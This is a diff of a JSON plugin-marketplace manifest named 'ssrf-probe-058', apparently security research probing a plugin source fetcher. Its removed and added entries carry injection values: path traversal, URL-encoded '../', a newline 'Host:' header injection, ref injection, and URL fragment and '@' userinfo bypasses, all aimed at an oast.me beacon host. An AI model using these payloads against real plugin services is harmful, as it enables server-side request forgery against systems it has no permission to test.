@@ -1,51 +1,31 @@
 {
-  "name": "ssrf-probe-058-v5",
-  "description": "path traversal in git-subdir",
+  "name": "ssrf-probe-058-CORRECT-OAST",
+  "description": "re-probe with correct beacon",
   "owner": {"name": "research", "email": "liamconner10@gmail.com"},
   "plugins": [
     {
-      "name": "subdir-traverse-1",
-      "description": "subdir ../",
+      "name": "valid-self",
+      "description": "baseline valid github",
       "category": "research",
-      "source": {
-        "source": "git-subdir",
-        "url": "https://github.com/LiamConner10/058-plugin-source.git",
-        "path": "../../../d8mpfmci7huhit7fcavgyyze45nko5p6s.oast.me",
-        "ref": "main"
-      }
+      "source": {"source": "url", "url": "https://github.com/LiamConner10/058-plugin-source"}
     },
     {
-      "name": "subdir-encoded",
-      "description": "subdir url-encoded ../",
+      "name": "fragment-after-host",
+      "description": "fragment bypass attempt",
       "category": "research",
-      "source": {
-        "source": "git-subdir",
-        "url": "https://github.com/LiamConner10/058-plugin-source.git",
-        "path": "%2e%2e%2f%2e%2e%2fd8mpfmci7huhit7fcavgyyze45nko5p6s.oast.me",
-        "ref": "main"
-      }
+      "source": {"source": "url", "url": "https://github.com/LiamConner10/058-plugin-source#@d8n1udci7huupncknsr0mcod7keuiyyra.oast.me/owner/repo"}
     },
     {
-      "name": "subdir-fragment",
-      "description": "subdir with newline",
+      "name": "fragment-only",
+      "description": "fragment-after-path",
       "category": "research",
-      "source": {
-        "source": "git-subdir",
-        "url": "https://github.com/LiamConner10/058-plugin-source.git",
-        "path": "x\nHost: d8mpfmci7huhit7fcavgyyze45nko5p6s.oast.me",
-        "ref": "main"
-      }
+      "source": {"source": "url", "url": "https://github.com/LiamConner10/058-plugin-source#d8n1udci7huupncknsr0mcod7keuiyyra.oast.me"}
     },
     {
-      "name": "subdir-ref-injection",
-      "description": "ref with injection",
+      "name": "git-subdir-correct-oast",
+      "description": "git-subdir to real repo",
       "category": "research",
-      "source": {
-        "source": "git-subdir",
-        "url": "https://github.com/LiamConner10/058-plugin-source.git",
-        "path": "x",
-        "ref": "../../d8mpfmci7huhit7fcavgyyze45nko5p6s.oast.me"
-      }
+      "source": {"source": "git-subdir", "url": "https://github.com/LiamConner10/058-plugin-source.git", "path": "subpath", "ref": "main"}
     }
   ]
 }
